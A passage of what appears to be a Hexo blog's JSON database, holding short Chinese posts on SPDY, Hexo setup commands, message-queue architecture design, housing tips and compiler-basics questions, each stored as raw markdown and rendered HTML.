[SPDY(发音同\"speedy\")：Google开发的下一代HTTP协议](http://josh-persistence.iteye.com/blog/2200727)\n\n（解决HTTP协议的缺点,Wrapper模式）\n\n概述\n\nSPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。","source":"_posts/SPDY：Google开发的下一代HTTP协议.md","raw":"---\ntitle: SPDY：Google开发的下一代HTTP协议\ndate: 2018-05-03 14:46:47\ntags: SPDY\narchives: HTTP协议\ncategories: HTTP\n---\n# [SPDY(发音同\"speedy\")：Google开发的下一代HTTP协议](http://josh-persistence.iteye.com/blog/2200727)\n\n（解决HTTP协议的缺点,Wrapper模式）\n\n概述\n\nSPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。","slug":"SPDY：Google开发的下一代HTTP协议","published":1,"updated":"2018-09-05T06:33:18.505Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxqp0003zodvo35wndxx","content":"<h1 id=\"SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\"><a href=\"#SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\" class=\"headerlink\" title=\"SPDY(发音同”speedy”)：Google开发的下一代HTTP协议\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200727\" target=\"_blank\" rel=\"noopener\">SPDY(发音同”speedy”)：Google开发的下一代HTTP协议</a></h1><p>（解决HTTP协议的缺点,Wrapper模式）</p>\n<p>概述</p>\n<p>SPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\"><a href=\"#SPDY-发音同”speedy”-：Google开发的下一代HTTP协议\" class=\"headerlink\" title=\"SPDY(发音同”speedy”)：Google开发的下一代HTTP协议\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200727\" target=\"_blank\" rel=\"noopener\">SPDY(发音同”speedy”)：Google开发的下一代HTTP协议</a></h1><p>（解决HTTP协议的缺点,Wrapper模式）</p>\n<p>概述</p>\n<p>SPDY是Google宣布正在开发的下一代网络协议，SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。HTTP自上世纪90年代问世以来，已有二十年的历史，期间互联网本身发生了很大的变化，也使得HTTP的许多不足暴露了出来，现在它已经不能满足许多web app的要求。Google表示，引入SPDY协议后，在实验室测试中页面加载速度比原先快64%，并且目前已经在Gmail等应用中使用。目前业界支持SPDY的服务器有Netty和Nginx(将要支持)。Nginx 官方发布下一个版本 1.3.0 的路线图，该版本将支持 Google SPDY。</p>\n"},{"title":"console用法","date":"2018-08-06T05:38:33.000Z","_content":"## [控制台的各种语法](https://www.imooc.com/article/12425)\n\n","source":"_posts/console用法.md","raw":"---\ntitle: console用法\ndate: 2018-08-06 13:38:33\ntags: console用法\ncategories: JS\n---\n## [控制台的各种语法](https://www.imooc.com/article/12425)\n\n","slug":"console用法","published":1,"updated":"2018-09-05T06:33:18.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxqu0006zodv0zgv6of3","content":"<h2 id=\"控制台的各种语法\"><a href=\"#控制台的各种语法\" class=\"headerlink\" title=\"控制台的各种语法\"></a><a href=\"https://www.imooc.com/article/12425\" target=\"_blank\" rel=\"noopener\">控制台的各种语法</a></h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"控制台的各种语法\"><a href=\"#控制台的各种语法\" class=\"headerlink\" title=\"控制台的各种语法\"></a><a href=\"https://www.imooc.com/article/12425\" target=\"_blank\" rel=\"noopener\">控制台的各种语法</a></h2>"},{"title":"Hello World","date":"2014-10-01T07:21:11.000Z","archives":null,"_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2014-10-1 15:21:11\ntags: \narchives: \ncategories: \n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","slug":"hello-world","published":1,"updated":"2018-09-05T06:33:18.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxqw0007zodv4oumfhtd","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"title":"webpack别名以及在scss中的用法","date":"2018-11-15T04:04:51.000Z","_content":"## webpack别名在sass中的用法 \n","source":"_posts/webpack别名以及在scss中的用法.md","raw":"---\ntitle: webpack别名以及在scss中的用法\ndate: 2018-11-15 12:04:51\ntags:\ncategories:\n---\n## webpack别名在sass中的用法 \n","slug":"webpack别名以及在scss中的用法","published":1,"updated":"2018-11-22T08:04:52.306Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxr60008zodvxutzco0s","content":"<h2 id=\"webpack别名在sass中的用法\"><a href=\"#webpack别名在sass中的用法\" class=\"headerlink\" title=\"webpack别名在sass中的用法\"></a>webpack别名在sass中的用法</h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"webpack别名在sass中的用法\"><a href=\"#webpack别名在sass中的用法\" class=\"headerlink\" title=\"webpack别名在sass中的用法\"></a>webpack别名在sass中的用法</h2>"},{"title":"三伏天计算","date":"2018-08-01T03:11:37.000Z","_content":"","source":"_posts/三伏天计算.md","raw":"---\ntitle: 三伏天计算\ndate: 2018-08-01 11:11:37\ntags:\ncategories:\n---\n","slug":"三伏天计算","published":1,"updated":"2018-09-05T06:33:18.512Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxra000czodvc6jq0pvo","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"不动产信息全国联网！下一步房产税","date":"2018-06-25T10:34:46.000Z","_content":"[不动产信息全国联网实现了！下一步仅是房产税？](https://zhidao.baidu.com/daily/view?id=131400)","source":"_posts/不动产信息全国联网！下一步房产税.md","raw":"---\ntitle: 不动产信息全国联网！下一步房产税\ndate: 2018-06-25 18:34:46\ntags:\ncategories:\n---\n[不动产信息全国联网实现了！下一步仅是房产税？](https://zhidao.baidu.com/daily/view?id=131400)","slug":"不动产信息全国联网！下一步房产税","published":1,"updated":"2018-09-05T06:33:18.512Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrc000dzodvgifnkg31","content":"<p><a href=\"https://zhidao.baidu.com/daily/view?id=131400\" target=\"_blank\" rel=\"noopener\">不动产信息全国联网实现了！下一步仅是房产税？</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://zhidao.baidu.com/daily/view?id=131400\" target=\"_blank\" rel=\"noopener\">不动产信息全国联网实现了！下一步仅是房产税？</a></p>\n"},{"title":"二手房注意点","date":"2018-05-21T02:25:38.000Z","_content":"\n## 购买二手房需要注意点\n\n房屋取得年限\n\n是否唯一住房\n\n原值\n\n关注微信公众号[有律在线]\n---\n[阅读原文](https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866)","source":"_posts/二手房注意点.md","raw":"---\ntitle: 二手房注意点\ndate: 2018-05-21 10:25:38\ntags: 二手房\ncategories: 二手房\n---\n\n## 购买二手房需要注意点\n\n房屋取得年限\n\n是否唯一住房\n\n原值\n\n关注微信公众号[有律在线]\n---\n[阅读原文](https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866)","slug":"二手房注意点","published":1,"updated":"2018-09-05T06:33:18.512Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxre000hzodvu1bn6588","content":"<h2 id=\"购买二手房需要注意点\"><a href=\"#购买二手房需要注意点\" class=\"headerlink\" title=\"购买二手房需要注意点\"></a>购买二手房需要注意点</h2><p>房屋取得年限</p>\n<p>是否唯一住房</p>\n<p>原值</p>\n<h2 id=\"关注微信公众号-有律在线\"><a href=\"#关注微信公众号-有律在线\" class=\"headerlink\" title=\"关注微信公众号[有律在线]\"></a>关注微信公众号[有律在线]</h2><p><a href=\"https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"购买二手房需要注意点\"><a href=\"#购买二手房需要注意点\" class=\"headerlink\" title=\"购买二手房需要注意点\"></a>购买二手房需要注意点</h2><p>房屋取得年限</p>\n<p>是否唯一住房</p>\n<p>原值</p>\n<h2 id=\"关注微信公众号-有律在线\"><a href=\"#关注微信公众号-有律在线\" class=\"headerlink\" title=\"关注微信公众号[有律在线]\"></a>关注微信公众号[有律在线]</h2><p><a href=\"https://baike.baidu.com/item/%E4%BA%8C%E6%89%8B%E6%88%BF/341764?secondId=474866\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"关于架构设计","date":"2018-10-02T12:26:57.000Z","_content":"## 架构设计\n> **架构设计的主要目的**：\n解决复杂度带来的问题\n\n### 架构复杂度来源\n1. 孜孜不倦追求 高性能\\\n  所有性能提高的背后，都是`方法的优化`和`系统复杂度的提高`\n\n2. 防止意外的高可用\\\n系统高可用 本质通过`冗余`，水多加面，面多加水\n\n3. 应对变化的可拓展\\\n保障在`不重构`的情况下，为`需求变化`提供实现可能\n\n高性能、高可用性、可拓展，是架构师工作着重考虑缓解，三点直接作用于 **架构设计内部**\n\n同样要注意 **外部环境** 对架构设计影响，比如`安全性`、`成本`、`规模`\n\n## 找出业务场景短板\n面对实际业务场景 \n\n### 第一步 分析并确定架构方向\n需要 `高可用?` `高性能?` `可扩展?` `安全?`\n\n### 第二步 准备几套备用方案\n与`开发` `运维`等部门讨论，选择针对实际情况最优方案\n\n\n## 虚拟场景\n前浪微博 中间件 团队 6人\n整体熟悉 JAVA，一人 C/C++\n开发平台 Linux\n数据库 MySQL\n业务系统 单机房部署\n\np.s: 发展快 系统协作效率低 各子系统 通过接口调用 出现问题 难定位\n\n架构设计问题根源 在于 各个业务 子系统 强耦合, `信息列队系统` 可满足 子系统 解耦\n\n## 架构难在哪里?\n难在灵活多变。高性能、高可用、可拓展、安全性、规模 等, 不可能样样兼顾\n\n### 判断复杂度\n对关键点 分权重\n1. 是否需要高性能？\\\n目前，发展趋势，预留系统容量 应对 未来业务增长。设计目标定为现在峰值4倍 较为合理\n\n2. 是否需要高可用？\\\n信息审核、用户服务 是社交媒体 关键业务。信息列队 需要 `高可用性`，包括 **信息写入、消息储存、消息读取**\n\n3. 是否需要高扩展？\\\n本虚拟场景 前浪微博 消息列队 功能明确，基本无须拓展\n\n### 初步设计备选方案，分析优缺点\n综上，前浪微博 信息列队系统 需要 **高性能 消息读取、高可用 消息写入、高可用 消息存储和读取**\n\n#### 3种备选方案\n1. 开源`Kafka` 本身是 成熟的开源信息列队方案，性能好\n2. `集群 + MySQL`存储。采用 数据分散集群架构，省略\n3. `集群 + 自研存储方案`\n\n","source":"_posts/关于架构设计.md","raw":"---\ntitle: 关于架构设计\ndate: 2018-10-02 20:26:57\ntags:\ncategories:\n---\n## 架构设计\n> **架构设计的主要目的**：\n解决复杂度带来的问题\n\n### 架构复杂度来源\n1. 孜孜不倦追求 高性能\\\n  所有性能提高的背后，都是`方法的优化`和`系统复杂度的提高`\n\n2. 防止意外的高可用\\\n系统高可用 本质通过`冗余`，水多加面，面多加水\n\n3. 应对变化的可拓展\\\n保障在`不重构`的情况下，为`需求变化`提供实现可能\n\n高性能、高可用性、可拓展，是架构师工作着重考虑缓解，三点直接作用于 **架构设计内部**\n\n同样要注意 **外部环境** 对架构设计影响，比如`安全性`、`成本`、`规模`\n\n## 找出业务场景短板\n面对实际业务场景 \n\n### 第一步 分析并确定架构方向\n需要 `高可用?` `高性能?` `可扩展?` `安全?`\n\n### 第二步 准备几套备用方案\n与`开发` `运维`等部门讨论，选择针对实际情况最优方案\n\n\n## 虚拟场景\n前浪微博 中间件 团队 6人\n整体熟悉 JAVA，一人 C/C++\n开发平台 Linux\n数据库 MySQL\n业务系统 单机房部署\n\np.s: 发展快 系统协作效率低 各子系统 通过接口调用 出现问题 难定位\n\n架构设计问题根源 在于 各个业务 子系统 强耦合, `信息列队系统` 可满足 子系统 解耦\n\n## 架构难在哪里?\n难在灵活多变。高性能、高可用、可拓展、安全性、规模 等, 不可能样样兼顾\n\n### 判断复杂度\n对关键点 分权重\n1. 是否需要高性能？\\\n目前，发展趋势，预留系统容量 应对 未来业务增长。设计目标定为现在峰值4倍 较为合理\n\n2. 是否需要高可用？\\\n信息审核、用户服务 是社交媒体 关键业务。信息列队 需要 `高可用性`，包括 **信息写入、消息储存、消息读取**\n\n3. 是否需要高扩展？\\\n本虚拟场景 前浪微博 消息列队 功能明确，基本无须拓展\n\n### 初步设计备选方案，分析优缺点\n综上，前浪微博 信息列队系统 需要 **高性能 消息读取、高可用 消息写入、高可用 消息存储和读取**\n\n#### 3种备选方案\n1. 开源`Kafka` 本身是 成熟的开源信息列队方案，性能好\n2. `集群 + MySQL`存储。采用 数据分散集群架构，省略\n3. `集群 + 自研存储方案`\n\n","slug":"关于架构设计","published":1,"updated":"2018-10-02T13:10:26.868Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxrg000jzodvng9pgl7q","content":"<h2 id=\"架构设计\"><a href=\"#架构设计\" class=\"headerlink\" title=\"架构设计\"></a>架构设计</h2><blockquote>\n<p><strong>架构设计的主要目的</strong>：<br>解决复杂度带来的问题</p>\n</blockquote>\n<h3 id=\"架构复杂度来源\"><a href=\"#架构复杂度来源\" class=\"headerlink\" title=\"架构复杂度来源\"></a>架构复杂度来源</h3><ol>\n<li><p>孜孜不倦追求 高性能\\<br>所有性能提高的背后，都是<code>方法的优化</code>和<code>系统复杂度的提高</code></p>\n</li>\n<li><p>防止意外的高可用\\<br>系统高可用 本质通过<code>冗余</code>，水多加面，面多加水</p>\n</li>\n<li><p>应对变化的可拓展\\<br>保障在<code>不重构</code>的情况下，为<code>需求变化</code>提供实现可能</p>\n</li>\n</ol>\n<p>高性能、高可用性、可拓展，是架构师工作着重考虑缓解，三点直接作用于 <strong>架构设计内部</strong></p>\n<p>同样要注意 <strong>外部环境</strong> 对架构设计影响，比如<code>安全性</code>、<code>成本</code>、<code>规模</code></p>\n<h2 id=\"找出业务场景短板\"><a href=\"#找出业务场景短板\" class=\"headerlink\" title=\"找出业务场景短板\"></a>找出业务场景短板</h2><p>面对实际业务场景 </p>\n<h3 id=\"第一步-分析并确定架构方向\"><a href=\"#第一步-分析并确定架构方向\" class=\"headerlink\" title=\"第一步 分析并确定架构方向\"></a>第一步 分析并确定架构方向</h3><p>需要 <code>高可用?</code> <code>高性能?</code> <code>可扩展?</code> <code>安全?</code></p>\n<h3 id=\"第二步-准备几套备用方案\"><a href=\"#第二步-准备几套备用方案\" class=\"headerlink\" title=\"第二步 准备几套备用方案\"></a>第二步 准备几套备用方案</h3><p>与<code>开发</code> <code>运维</code>等部门讨论，选择针对实际情况最优方案</p>\n<h2 id=\"虚拟场景\"><a href=\"#虚拟场景\" class=\"headerlink\" title=\"虚拟场景\"></a>虚拟场景</h2><p>前浪微博 中间件 团队 6人<br>整体熟悉 JAVA，一人 C/C++<br>开发平台 Linux<br>数据库 MySQL<br>业务系统 单机房部署</p>\n<p>p.s: 发展快 系统协作效率低 各子系统 通过接口调用 出现问题 难定位</p>\n<p>架构设计问题根源 在于 各个业务 子系统 强耦合, <code>信息列队系统</code> 可满足 子系统 解耦</p>\n<h2 id=\"架构难在哪里\"><a href=\"#架构难在哪里\" class=\"headerlink\" title=\"架构难在哪里?\"></a>架构难在哪里?</h2><p>难在灵活多变。高性能、高可用、可拓展、安全性、规模 等, 不可能样样兼顾</p>\n<h3 id=\"判断复杂度\"><a href=\"#判断复杂度\" class=\"headerlink\" title=\"判断复杂度\"></a>判断复杂度</h3><p>对关键点 分权重</p>\n<ol>\n<li><p>是否需要高性能？\\<br>目前，发展趋势，预留系统容量 应对 未来业务增长。设计目标定为现在峰值4倍 较为合理</p>\n</li>\n<li><p>是否需要高可用？\\<br>信息审核、用户服务 是社交媒体 关键业务。信息列队 需要 <code>高可用性</code>，包括 <strong>信息写入、消息储存、消息读取</strong></p>\n</li>\n<li><p>是否需要高扩展？\\<br>本虚拟场景 前浪微博 消息列队 功能明确，基本无须拓展</p>\n</li>\n</ol>\n<h3 id=\"初步设计备选方案，分析优缺点\"><a href=\"#初步设计备选方案，分析优缺点\" class=\"headerlink\" title=\"初步设计备选方案，分析优缺点\"></a>初步设计备选方案，分析优缺点</h3><p>综上，前浪微博 信息列队系统 需要 <strong>高性能 消息读取、高可用 消息写入、高可用 消息存储和读取</strong></p>\n<h4 id=\"3种备选方案\"><a href=\"#3种备选方案\" class=\"headerlink\" title=\"3种备选方案\"></a>3种备选方案</h4><ol>\n<li>开源<code>Kafka</code> 本身是 成熟的开源信息列队方案，性能好</li>\n<li><code>集群 + MySQL</code>存储。采用 数据分散集群架构，省略</li>\n<li><code>集群 + 自研存储方案</code></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"架构设计\"><a href=\"#架构设计\" class=\"headerlink\" title=\"架构设计\"></a>架构设计</h2><blockquote>\n<p><strong>架构设计的主要目的</strong>：<br>解决复杂度带来的问题</p>\n</blockquote>\n<h3 id=\"架构复杂度来源\"><a href=\"#架构复杂度来源\" class=\"headerlink\" title=\"架构复杂度来源\"></a>架构复杂度来源</h3><ol>\n<li><p>孜孜不倦追求 高性能\\<br>所有性能提高的背后，都是<code>方法的优化</code>和<code>系统复杂度的提高</code></p>\n</li>\n<li><p>防止意外的高可用\\<br>系统高可用 本质通过<code>冗余</code>，水多加面，面多加水</p>\n</li>\n<li><p>应对变化的可拓展\\<br>保障在<code>不重构</code>的情况下，为<code>需求变化</code>提供实现可能</p>\n</li>\n</ol>\n<p>高性能、高可用性、可拓展，是架构师工作着重考虑缓解，三点直接作用于 <strong>架构设计内部</strong></p>\n<p>同样要注意 <strong>外部环境</strong> 对架构设计影响，比如<code>安全性</code>、<code>成本</code>、<code>规模</code></p>\n<h2 id=\"找出业务场景短板\"><a href=\"#找出业务场景短板\" class=\"headerlink\" title=\"找出业务场景短板\"></a>找出业务场景短板</h2><p>面对实际业务场景 </p>\n<h3 id=\"第一步-分析并确定架构方向\"><a href=\"#第一步-分析并确定架构方向\" class=\"headerlink\" title=\"第一步 分析并确定架构方向\"></a>第一步 分析并确定架构方向</h3><p>需要 <code>高可用?</code> <code>高性能?</code> <code>可扩展?</code> <code>安全?</code></p>\n<h3 id=\"第二步-准备几套备用方案\"><a href=\"#第二步-准备几套备用方案\" class=\"headerlink\" title=\"第二步 准备几套备用方案\"></a>第二步 准备几套备用方案</h3><p>与<code>开发</code> <code>运维</code>等部门讨论，选择针对实际情况最优方案</p>\n<h2 id=\"虚拟场景\"><a href=\"#虚拟场景\" class=\"headerlink\" title=\"虚拟场景\"></a>虚拟场景</h2><p>前浪微博 中间件 团队 6人<br>整体熟悉 JAVA，一人 C/C++<br>开发平台 Linux<br>数据库 MySQL<br>业务系统 单机房部署</p>\n<p>p.s: 发展快 系统协作效率低 各子系统 通过接口调用 出现问题 难定位</p>\n<p>架构设计问题根源 在于 各个业务 子系统 强耦合, <code>信息列队系统</code> 可满足 子系统 解耦</p>\n<h2 id=\"架构难在哪里\"><a href=\"#架构难在哪里\" class=\"headerlink\" title=\"架构难在哪里?\"></a>架构难在哪里?</h2><p>难在灵活多变。高性能、高可用、可拓展、安全性、规模 等, 不可能样样兼顾</p>\n<h3 id=\"判断复杂度\"><a href=\"#判断复杂度\" class=\"headerlink\" title=\"判断复杂度\"></a>判断复杂度</h3><p>对关键点 分权重</p>\n<ol>\n<li><p>是否需要高性能？\\<br>目前，发展趋势，预留系统容量 应对 未来业务增长。设计目标定为现在峰值4倍 较为合理</p>\n</li>\n<li><p>是否需要高可用？\\<br>信息审核、用户服务 是社交媒体 关键业务。信息列队 需要 <code>高可用性</code>，包括 <strong>信息写入、消息储存、消息读取</strong></p>\n</li>\n<li><p>是否需要高扩展？\\<br>本虚拟场景 前浪微博 消息列队 功能明确，基本无须拓展</p>\n</li>\n</ol>\n<h3 id=\"初步设计备选方案，分析优缺点\"><a href=\"#初步设计备选方案，分析优缺点\" class=\"headerlink\" title=\"初步设计备选方案，分析优缺点\"></a>初步设计备选方案，分析优缺点</h3><p>综上，前浪微博 信息列队系统 需要 <strong>高性能 消息读取、高可用 消息写入、高可用 消息存储和读取</strong></p>\n<h4 id=\"3种备选方案\"><a href=\"#3种备选方案\" class=\"headerlink\" title=\"3种备选方案\"></a>3种备选方案</h4><ol>\n<li>开源<code>Kafka</code> 本身是 成熟的开源信息列队方案，性能好</li>\n<li><code>集群 + MySQL</code>存储。采用 数据分散集群架构，省略</li>\n<li><code>集群 + 自研存储方案</code></li>\n</ol>\n"},{"title":"基础编译原理和语言知识","date":"2018-08-02T06:20:22.000Z","_content":"## 基础编译原理和语言知识\n\n`think deeply`  \n\n1. 什么是编译器，它以什么为分界线，分为前端和后端？      \n\n    [JVM即时编译(JIT)](https://blog.csdn.net/sunxianghuang/article/details/52094859)\n\n2. `Java` 是编译型语言还是解释型语言，`Python` 呢？\n\n3. `C` 语言的编译器也是 `C` 语言，那它怎么被编译的？\n\n4. 目标文件的格式是什么样的，段表、符号表、重定位表有什么作用？\n\n5. `Swift` 是静态语言，为什么还有运行时库？\n\n6. 什么是 `ABI，ABI` 不稳定有什么问题？\n\n7. 什么是 `WebAssembly`，为什么要推出这门技术，用 `C++` 代替 `JavaScript` 可行么？\n\n8. `JavaScript` 和 `DOM API` 是什么关系，`JavaScript` 可以读写文件么？\n\n9.  `C++` 代码可以自动转换成 `Java` 代码么，任意两种语言是否可以互转？\n\n10. 为什么说 `Python` 是胶水语言，它可以用来开发 `iOS/Android` 么？  \n\n  \n[阅读原文](https://www.ctolib.com/topics-119548.html)\n\n---\n### 拓展阅读\n","source":"_posts/基础编译原理和语言知识.md","raw":"---\ntitle: 基础编译原理和语言知识\ndate: 2018-08-02 14:20:22\ntags: 基础原理\ncategories: 计算机技术原理\n---\n## 基础编译原理和语言知识\n\n`think deeply`  \n\n1. 什么是编译器，它以什么为分界线，分为前端和后端？      \n\n    [JVM即时编译(JIT)](https://blog.csdn.net/sunxianghuang/article/details/52094859)\n\n2. `Java` 是编译型语言还是解释型语言，`Python` 呢？\n\n3. 